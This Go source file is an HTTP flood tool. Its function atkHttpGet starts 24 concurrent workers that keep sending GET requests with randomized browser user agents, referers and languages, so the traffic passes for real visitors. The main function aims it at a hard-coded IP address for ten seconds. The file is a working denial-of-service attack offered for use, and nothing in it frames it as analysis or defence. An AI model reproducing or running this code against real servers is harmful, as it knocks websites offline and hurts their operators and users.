package main

import (
	"context"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.yahoo.com/",
	"https://www.duckduckgo.com/",
	"https://www.yandex.com/",
	"https://www.baidu.com/",
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"fr-FR,fr;q=0.9",
	"es-ES,es;q=0.9",
	"de-DE,de;q=0.9",
}

// func httpget(url string) {
// 	jar, _ := cookiejar.New(nil)
// 	client := &http.Client{
// 		Jar: jar,
// 	}
// 	req, _ := http.NewRequest("GET", url, nil)

// 	r := rand.New(rand.NewSource(time.Now().UnixNano()))

// 	// set http headers
// 	req.Header.Set("User-Agent", userAgents[r.Intn(len(userAgents))])
// 	req.Header.Set("Referer", referers[r.Intn(len(referers))])
// 	req.Header.Set("Accept-Language", acceptLanguages[r.Intn(len(acceptLanguages))])
// 	req.Header.Set("Connection", "keep-alive")
// 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

// 	// fmt.Println("Request Headers:")
// 	// for key, values := range req.Header {
// 	// 	for _, value := range values {
// 	// 		fmt.Printf("%s: %s\n", key, value)
// 	// 	}
// 	// }

// 	resp, _ := client.Do(req)
// 	defer resp.Body.Close()

// 	body, _ := io.ReadAll(resp.Body)
// 	fmt.Println(string(body))
// }

// not writing it here, but check if http or https is enabled in the server
// dont want the program to crash
func atkHttpGet(host string, duration int) {
	jar, _ := cookiejar.New(nil)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup

	for i := 0; i < 24; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{
				Jar: jar,
			}

			for {
				select {
				case <-ctx.Done():
					return
				default:
					//body := make([]byte, 4096)
					req, _ := http.NewRequest("GET", host, nil)

					req.Header.Set("User-Agent", userAgents[r.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[r.Intn(len(referers))])
					req.Header.Set("Accept-Language", acceptLanguages[r.Intn(len(acceptLanguages))])
					req.Header.Set("Connection", "keep-alive")
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

					resp, err := client.Do(req)

					if err != nil {
						//fmt.Println(err)
						continue
					}

					defer resp.Body.Close()

				}
			}
		}()
	}
	wg.Wait()
}

func main() {

	atkHttpGet("https://142.132.142.224", 10)
}
